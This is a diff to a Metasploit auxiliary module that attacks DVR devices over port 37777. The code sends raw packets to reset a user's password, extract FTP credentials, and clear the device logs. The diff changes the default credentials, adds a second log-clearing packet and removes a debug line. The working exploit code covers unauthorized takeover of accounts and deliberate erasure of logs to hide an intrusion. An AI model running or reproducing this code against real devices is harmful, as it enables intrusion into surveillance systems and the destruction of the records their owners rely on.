@@ -15,8 +15,8 @@ class Metasploit3 < Msf::Auxiliary
 		deregister_options('RHOST')
                 register_options(
                         [
- 				OptString.new('USERNAME', [false, 'A username to add',  'admin2']),
- 				OptString.new('PASSWORD', [false, 'A password for the added user',  'Abcd123$']),
+ 				OptString.new('USERNAME', [true, 'A username to reset', '888888']),
+ 				OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
 				OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
 				OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
                                 Opt::RPORT(37777)
@@ -46,8 +46,10 @@ class Metasploit3 < Msf::Auxiliary
 			  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		sn = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" +
 		      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-		clear_logs = "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00" +
-			      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		clear_logs =  "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" +
+			      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		clear_logs2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
+			      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		user = "root"
 		pass = " w"
 		user8pwhash = "4WzwxXxM" #888888
@@ -132,7 +134,7 @@ class Metasploit3 < Msf::Auxiliary
 					print_good("	FTP User: #{ftpuser}")
 					print_good("	FTP Password: #{ftppass}")
 					#report_auth_info(:host => server, :port => port, :user => ftpuser, :pass => ftppass, :type => "FTP", 
-					                #s	:active => true) if ( !server.nil? and !port.nil? and !ftpuser.nil? and !ftppass.nil? )
+						  #:active => true) if ( !server.nil? and !port.nil? and !ftpuser.nil? and !ftppass.nil? )
 				end
 			end
 			
@@ -165,7 +167,6 @@ class Metasploit3 < Msf::Auxiliary
 				}
 			end
 			if (datastore['RESET'])
-			  print_status("HELLO")
 				userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] +
 					":" +  datastore['PASSWORD']
 				u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" +
@@ -260,6 +261,7 @@ class Metasploit3 < Msf::Auxiliary
 			
 			if (datastore['CLEAR_LOGS'])
 				sock.put(clear_logs)
+				sock.put(clear_logs2)
 				print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
 			end
 			disconnect()
